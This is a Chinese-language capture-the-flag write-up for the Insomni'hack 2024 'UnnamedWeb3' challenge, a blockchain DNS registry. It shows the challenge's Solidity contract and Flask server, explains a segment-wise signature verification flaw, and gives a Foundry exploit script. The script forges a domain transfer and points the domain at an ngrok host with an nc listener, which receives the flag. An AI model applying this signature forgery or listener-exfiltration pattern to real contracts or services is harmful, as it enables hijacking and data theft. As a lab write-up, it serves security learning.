---
title: Blockchain - UnnamedWeb3
description: 2024 | Insomni'hack Teaser | web3
tags:
    - smart contract
    - web
---

## 题目

Introducing UnnamedWeb3 - now fortified with Smart Contract technology and Blockchain for robust, decentralized DNS security.

https://unnamed.insomnihack.ch

??? note "Challenge.sol"

    ```js
    // SPDX-License-Identifier: UNLICENSED
    pragma solidity 0.8.19;

    contract DomainRegistry {
        struct DomainDetails {
            address owner;
            string ip;
        }

        mapping(string => DomainDetails) domains;
        address signer;

        event DomainRegistered(string domain, address owner, string ip);
        event DomainTransfered(string domain, address owner, string ip);
        event TransferInitiated(string domain, address destination);
        event IpUpdated(string domain, string newIp);

        constructor(address _signer) {
            signer = _signer;
        }

        function registerInsoDomain(
            string memory domain,
            string memory ip
        ) public payable {
            require(msg.value == 1 ether, "Registration fee is 1 ETH");

            domain = string.concat(domain, ".inso");
            require(
                domains[domain].owner == address(0),
                "Domain already registered"
            );

            DomainDetails memory newDomain = DomainDetails({
                owner: msg.sender,
                ip: ip
            });

            domains[domain] = newDomain;

            emit DomainRegistered(domain, msg.sender, ip);
        }

        function verify(
            string memory domain,
            address owner,
            bytes memory signature
        ) private view returns (bool) {
            domain = string(abi.encodePacked(domain, "."));

            uint8 partCount = 0;
            for (uint i = 0; i < bytes(domain).length; i++) {
                if (bytes(domain)[i] == ".") {
                    partCount++;
                    require(partCount <= 64, "too many dots");
                }
            }

            bytes32[] memory parts = new bytes32[](partCount);
            uint8 partIndex = 0;
            string memory part;
            for (uint i = 0; i < bytes(domain).length; i++) {
                if (bytes(domain)[i] == ".") {
                    part = string(abi.encodePacked(part, partCount - partIndex));
                    bytes32 tmp;
                    assembly {
                        tmp := mload(add(part, 32))
                    }
                    parts[partIndex] = tmp;
                    partIndex++;
                    part = "";
                } else {
                    part = string(abi.encodePacked(part, bytes(domain)[i]));
                }
            }

            for (uint i = 0; i < partCount; i++) {
                bytes32 r;
                bytes32 s;
                uint8 v = uint8(signature[i * 65 + 64]);
                assembly {
                    r := mload(add(signature, add(32, mul(i, 65))))
                    s := mload(add(signature, add(64, mul(i, 65))))
                }
                bytes32 hash = keccak256(abi.encodePacked(parts[i], owner));
                require(ecrecover(hash, v, r, s) == signer, "Invalid signature");
            }

            return true;
        }

        function initiateTransfer(
            string memory domain,
            address destination
        ) public {
            require(
                domains[domain].owner == msg.sender,
                "Transfer must be initiated by owner"
            );

            emit TransferInitiated(domain, destination);
        }

        function transferDomain(
            string memory domain,
            string memory ip,
            bytes memory transferCode
        ) public {
            if (!verify(domain, msg.sender, transferCode)) {
                revert("Invalid transfer code");
            }

            DomainDetails memory newDomain = DomainDetails({
                owner: msg.sender,
                ip: ip
            });

            domains[domain] = newDomain;

            emit DomainTransfered(domain, msg.sender, ip);
        }

        function getDomainOwner(
            string memory domain
        ) public view returns (address) {
            return domains[domain].owner;
        }

        function updateIp(string memory domain, string memory newIp) public {
            require(
                domains[domain].owner == msg.sender,
                "Only owner can update IP"
            );

            domains[domain].ip = newIp;

            emit IpUpdated(domain, newIp);
        }

        function resolveIp(
            string memory domain
        ) public view returns (string memory ip) {
            return domains[domain].ip;
        }

        function withdraw() public {
            require(msg.sender == signer, "Only signer can withdraw");
            payable(msg.sender).transfer(address(this).balance);
        }
    }
    ```

??? note "webserver.py"

    ```py
    #!/usr/bin/env python3
    from flask import Flask, send_from_directory, render_template, session, request
    from flask_limiter import Limiter
    from secrets import token_hex
    import os
    import requests
    import helpers

    FLAG = os.getenv("FLAG", "INS{fake_flag}")
    CHALLENGE_DOMAIN = "insomnihack.flag"

    app = Flask(__name__)
    app.secret_key = os.getenv("FLASK_SECRET_KEY") or token_hex(16)

    app.config["SESSION_PERMANENT"] = False
    app.config["SESSION_TYPE"] = "filesystem"

    def get_remote_address():
        return request.access_route[0]

    limiter = Limiter(get_remote_address,
                    app=app,
                    default_limits=["60 per minute", "10 per second"],
                    storage_uri="memory://")

    @app.route("/", methods=["GET"])
    def index():
        if "subdomain" not in session:
            session["subdomain"] = token_hex(8)
        challenge_host = session["subdomain"] + "." + CHALLENGE_DOMAIN

        deployed = False
        rpc = None
        wallet = None
        contract = None
        if "instance_id" in session:
            if helpers.is_instance_running(session["instance_id"]):
                deployed = True
                rpc = session["rpc"]
                wallet = session["wallet"]
                contract = session["contract"]
            else:
                del session["instance_id"]
                del session["rpc"]
                del session["wallet"]
                del session["contract"]

        return render_template(
            "index.html",
            challenge_host=challenge_host,
            deployed=deployed,
            rpc=rpc,
            wallet=wallet,
            contract=contract,
        )


    @app.route("/static/<path:path>", methods=["GET"])
    def static_file(path):
        return send_from_directory("static", path)


    @app.route("/domain-query", methods=["GET"])
    def dns_query_get():
        domain = request.args.get("domain")
        if domain is None:
            return "Invalid request", 400

        if "instance_id" not in session:
            return "Instance not running", 400

        return helpers.resolve_domain(session["instance_id"], domain)


    @app.route("/transfer-codes", methods=["GET"])
    def transfer_codes():
        if "instance_id" not in session:
            return "Invalid session", 400

        contract = helpers.get_contract(session["instance_id"])
        events = contract.events.TransferInitiated().get_logs(fromBlock=0)
        transfer_codes = []
        for event in events:
            domain = event["args"]["domain"]
            recipient = event["args"]["destination"]
            code = helpers.generate_transfer_code(domain, recipient)
            transfer_codes.append({"domain": domain, "recipient": recipient, "code": code})

        return transfer_codes

    @app.route("/transfer-code/<req_domain>/<req_recipient>", methods=["GET"])
    def transfer_code(req_domain, req_recipient):
        if "instance_id" not in session:
            return "Invalid session", 400
        
        contract = helpers.get_contract(session["instance_id"])
        events = contract.events.TransferInitiated().get_logs(fromBlock=0)
        for event in events:
            domain = event["args"]["domain"]
            recipient = event["args"]["destination"]
            if domain == req_domain and recipient.lower() == req_recipient.lower():
                return helpers.generate_transfer_code(domain, recipient), 200
            
        return "Transfer not initiated", 401


    @app.route("/send-flag", methods=["POST"])
    def send_flag():
        if "subdomain" not in session:
            return "Invalid session", 400

        if "instance_id" not in session:
            return "Instance not running", 400

        port = 80
        if "port" in request.args:
            try:
                port = int(request.args["port"])
            except:
                return "Invalid port", 400

        if port < 1 or port > 65535:
            return "Invalid port", 400

        # Resolve the domain by calling the `resolveIp` function of the contract
        host = helpers.resolve_domain(
            session["instance_id"], session["subdomain"] + "." + CHALLENGE_DOMAIN
        )
        if host is None or host == "":
            return "No DNS entry for this domain", 400
        try:
            requests.post(f"http://{host}:{port}", data=FLAG, timeout=2)
        except Exception as e:
            return str(e)

        return f"Flag sent to {host}"


    @app.route("/create-instance", methods=["POST"])
    @limiter.limit("2 per minute; 3 per 10 minutes; 4 per 20 minutes")
    def create():
        # Remark: The instance is destroyed after 20 minutes
        instance = helpers.create_instance()

        if instance["status"] == "success":
            session["instance_id"] = instance["instance_id"]
            session["rpc"] = instance["rpc"]
            session["wallet"] = instance["wallet"]
            session["contract"] = instance["contract"]

        return instance


    @app.route("/stop-instance", methods=["POST"])
    def stop():
        if "instance_id" in session:
            helpers.stop_instance(session["instance_id"])
            del session["instance_id"]
            del session["rpc"]
            del session["wallet"]
            del session["contract"]
            return {"status": "success", "message": "Instance stopped"}
        else:
            return {"status": "failed", "message": "No instance running"}


    if __name__ == "__main__":
        app.run(debug=True)
    ```

## 解题思路

- `DomainRegistry` 记录域名到 IP 的映射及域名所有者，并允许用户注册域名、转移域名所有权
- 为获取 Flag，需要将特定域名 `<instance_id>.insomnihack.flag` 映射到受控 IP 地址，而通过 `registerInsoDomain()` 只能注册以 `.inso` 结尾的域名

    ```py
    # Resolve the domain by calling the `resolveIp` function of the contract
    host = helpers.resolve_domain(
        session["instance_id"], session["subdomain"] + "." + CHALLENGE_DOMAIN
    )
    if host is None or host == "":
        return "No DNS entry for this domain", 400
    try:
        requests.post(f"http://{host}:{port}", data=FLAG, timeout=2)
    ```

- 在持有服务器签名的情况下，可使用 `transferDomain()` 更新域名所有者及 IP 地址。服务器签名可在调用 `initiateTransfer()` 后，通过 `GET /transfer-codes` 获取
- 签名验证并非针对整个域名，而是分段进行的，为构造提供了可能。对于按 `.` 分割的域名的各个部分，附上 `partCount - partIndex` 的值，取前 32 字节作为一段进行验证。那么只要注册的域名按 `.` 分割的各部分（除 `.inso`）至少为 32 字节，就能通过 `initiateTransfer()` 获取任意签名，再通过 `transferDomain()` 设置 IP 地址即可获取 Flag

    ```js
    contract UnnamedWeb3Script is Script {

        function register() public {
            vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
            DomainRegistry registry = DomainRegistry(vm.envAddress("INSTANCE_ADDR"));
            string memory domain;
            string memory part = string(abi.encodePacked("6b8508d1c6065ac5", uint8(3)));
            bytes32 tmp;
            assembly {
                tmp := mload(add(part, 32))
            }
            domain = string(abi.encodePacked(domain, tmp));
            part = string(abi.encodePacked("insomnihack", uint8(2)));
            assembly {
                tmp := mload(add(part, 32))
            }
            domain = string(abi.encodePacked(domain, ".", tmp));
            part = string(abi.encodePacked("flag", uint8(1)));
            assembly {
                tmp := mload(add(part, 32))
            }
            domain = string(abi.encodePacked(domain, ".", tmp));
            registry.registerInsoDomain{value: 1 ether}(domain, "1.3.3.7");
            registry.initiateTransfer(
                string.concat(domain, ".inso"),
                vm.addr(vm.envUint("PRIVATE_KEY"))
            );
            vm.stopBroadcast();
        }

        function transfer() public {
            vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
            DomainRegistry registry = DomainRegistry(vm.envAddress("INSTANCE_ADDR"));
            registry.transferDomain(
                "6b8508d1c6065ac5.insomnihack.flag",
                // nc -l -p 8080
                // ngrok http 8080
                "<->.ngrok-free.app",
                bytes(hex"")    // copy the signature from https://unnamed.insomnihack.ch/transfer-codes
            );
            vm.stopBroadcast();
        }
    }
    ```

### Flag

> INS{H0dl_y0ur_INSO_co1n5_plz!}